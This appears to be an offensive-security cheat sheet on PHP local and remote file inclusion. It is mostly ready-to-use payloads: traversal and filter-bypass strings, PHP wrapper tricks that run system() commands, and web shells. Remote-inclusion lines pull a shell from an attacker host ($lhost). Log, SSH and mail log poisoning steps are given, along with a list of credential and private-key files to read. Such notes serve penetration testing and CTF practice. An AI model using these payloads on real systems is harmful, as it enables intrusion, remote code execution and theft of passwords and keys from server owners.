# File Inclusion (LFI/RFI)

## Table of Contents
- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
  - [Basic LFI](#basic-lfi)
  - [Path Traversal](#path-traversal)
  - [Filter Bypass](#filter-bypass)
  - [PHP Wrappers](#php-wrappers)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [Log Poisoning](#log-poisoning)
- [LFI to RCE](#lfi-to-rce)
- [Server-Specific LFI](#server-specific-lfi)
  - [Nginx merge_slashes](#nginx-merge_slashes)
  - [NuxtJS Dev Mode](#nuxtjs-dev-mode)
- [Common Files to Read](#common-files-to-read)

---

## Local File Inclusion (LFI)

### Basic LFI

```
http://$rhost/page.php?file=/etc/passwd
http://$rhost/page.php?page=../../../../etc/passwd
http://$rhost/index.php?lang=../../../etc/passwd
```

### Path Traversal

```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
```

### Traversal Strings

| Encoded | Description |
| :--- | :--- |
| `../` | Basic traversal |
| `..\` | Windows traversal |
| `..\/` | Mixed slash |
| `%2e%2e%2f` | URL encoded |
| `%252e%252e%252f` | Double URL encoded |
| `%c0%ae%c0%ae%c0%af` | UTF-8 encoded |
| `..././` | Bypass simple filter |
| `....//` | Bypass simple filter |
| `....\/` | Bypass simple filter |
| `..%00/` | Null byte (older PHP) |

### Filter Bypass

#### Null Byte (PHP < 5.3)

```
http://$rhost/page.php?file=../../../../etc/passwd%00
http://$rhost/page.php?file=../../../../etc/passwd%00.php
```

#### Double Encoding

```
%252e%252e%252f = ../
%252e%252e%255c = ..\
```

#### Path Truncation

```
http://$rhost/page.php?file=../../../etc/passwd.......................
http://$rhost/page.php?file=../../../etc/passwd./././././././././././
```

---

## PHP Wrappers

### php://filter (Read Source Code)

```
http://$rhost/page.php?file=php://filter/convert.base64-encode/resource=index.php
http://$rhost/page.php?file=php://filter/convert.base64-encode/resource=config.php
http://$rhost/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
```

Decode:
```shell
echo "BASE64_STRING" | base64 -d
```

### php://input (RCE)

```shell
curl -X POST http://$rhost/page.php?file=php://input --data '<?php system($_GET["cmd"]); ?>'
curl -X POST http://$rhost/page.php?file=php://input --data '<?php system("id"); ?>'
```

### data:// Wrapper

```
http://$rhost/page.php?file=data://text/plain,<?php system('id'); ?>
http://$rhost/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### expect:// Wrapper

```
http://$rhost/page.php?file=expect://id
http://$rhost/page.php?file=expect://whoami
```

### zip:// Wrapper

```shell
# Create payload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
```

```
http://$rhost/page.php?file=zip://./uploads/shell.zip%23shell.php&cmd=id
```

### phar:// Wrapper

```
http://$rhost/page.php?file=phar://./uploads/shell.phar/shell.php
```

---

## Remote File Inclusion (RFI)

> Requires `allow_url_include = On` in php.ini

### Basic RFI

```
http://$rhost/page.php?file=http://$lhost/shell.txt
http://$rhost/page.php?file=http://$lhost/shell.php
http://$rhost/page.php?file=ftp://$lhost/shell.txt
```

### Null Byte RFI

```
http://$rhost/page.php?file=http://$lhost/shell.txt%00
```

### Setup Malicious Server

```shell
# Create shell
echo '<?php system($_GET["cmd"]); ?>' > shell.txt

# Serve it
python3 -m http.server 80
```

---

## Log Poisoning

### Apache Log Poisoning

1. Inject PHP code into User-Agent:
```shell
curl -A "<?php system(\$_GET['cmd']); ?>" http://$rhost/
```

2. Include the log file:
```
http://$rhost/page.php?file=/var/log/apache2/access.log&cmd=id
http://$rhost/page.php?file=/var/log/httpd/access_log&cmd=id
```

### SSH Log Poisoning

1. Connect with PHP payload as username:
```shell
ssh '<?php system($_GET["cmd"]); ?>'@$rhost
```

2. Include the auth log:
```
http://$rhost/page.php?file=/var/log/auth.log&cmd=id
```

### Mail Log Poisoning

1. Send email with PHP payload:
```shell
telnet $rhost 25
MAIL FROM: <attacker@evil.com>
RCPT TO: <?php system($_GET['cmd']); ?>
```

2. Include mail log:
```
http://$rhost/page.php?file=/var/mail/www-data&cmd=id
```

---

## LFI to RCE

### PHP Session Files

1. Set session with PHP code:
```
http://$rhost/page.php?name=<?php system($_GET['cmd']); ?>
```

2. Include session file:
```
http://$rhost/page.php?file=/var/lib/php/sessions/sess_SESSIONID&cmd=id
http://$rhost/page.php?file=/tmp/sess_SESSIONID&cmd=id
```

### /proc/self/environ

```
# Inject PHP into User-Agent, then:
http://$rhost/page.php?file=/proc/self/environ
```

### PHP Filter Chain Generator

> https://github.com/synacktiv/php_filter_chain_generator

```shell
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

---

## Common Files to Read

### Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/ssh/sshd_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/proc/self/environ
/proc/self/cmdline
/proc/version
/home/$user/.ssh/id_rsa
/home/$user/.ssh/authorized_keys
/home/$user/.bash_history
/root/.ssh/id_rsa
/root/.bash_history
```

### Windows

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\Users\$user\.ssh\id_rsa
```

### Web Application Files

```
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/var/www/html/web.config
```

---

## Server-Specific LFI

### Nginx merge_slashes

> Nginx's `merge_slashes on` (default) can be bypassed with multiple slashes

```shell
# Standard LFI blocked by WAF/filter
curl "http://$rhost/index.php?page=../../../../../../etc/passwd"
# Blocked!

# Bypass with merge_slashes exploitation
curl "http://$rhost/index.php?page=///..////..///..////..///tmp///flag.txt"
curl "http://$rhost/index.php?page=///..////..///..///..///etc///passwd"

# Multiple slashes get merged but may bypass pattern matching
# Works when filter checks for "../" but not "///..///"
```

### NuxtJS Dev Mode

> NuxtJS in development mode exposes filesystem via `/_nuxt/@fs/`

```shell
# Check if dev mode is enabled
curl "http://$rhost:3000/_nuxt/"

# Access arbitrary files via @fs path
curl "http://$rhost:3000/_nuxt/@fs/etc/passwd"
curl "http://$rhost:3000/_nuxt/@fs/tmp/flag.txt"
curl "http://$rhost:3000/_nuxt/@fs/root/.ssh/id_rsa"

# Access project source code
curl "http://$rhost:3000/_nuxt/@fs/app/nuxt.config.js"
curl "http://$rhost:3000/_nuxt/@fs/app/.env"
```

### Express.js Static File Bypass

```shell
# URL encoded path traversal
curl "http://$rhost/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Double encoding
curl "http://$rhost/%252e%252e/%252e%252e/etc/passwd"
```

---

## Payload Cheat Sheet

| Payload | Description |
| :--- | :--- |
| `../../../etc/passwd` | Basic LFI |
| `....//....//etc/passwd` | Filter bypass |
| `%2e%2e%2f%2e%2e%2fetc/passwd` | URL encoded |
| `php://filter/convert.base64-encode/resource=` | Read source code |
| `php://input` + POST data | RCE via input |
| `data://text/plain,<?php system('id'); ?>` | RCE via data |
| `expect://id` | RCE via expect |
| `/var/log/apache2/access.log` | Log poisoning |
| `/proc/self/environ` | Env poisoning |

---

## See Also

- **[Command Injection](7.4.Command-Injection.md)** - RCE after LFI
- **[File Upload](7.8.File-Upload.md)** - Combine with LFI for shell
- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Initial enumeration
- **[CVE Exploits](../2.CVE-Exploit/2.1.CVE-Exploit.md)** - WordPress Mail Masta, other LFI CVEs
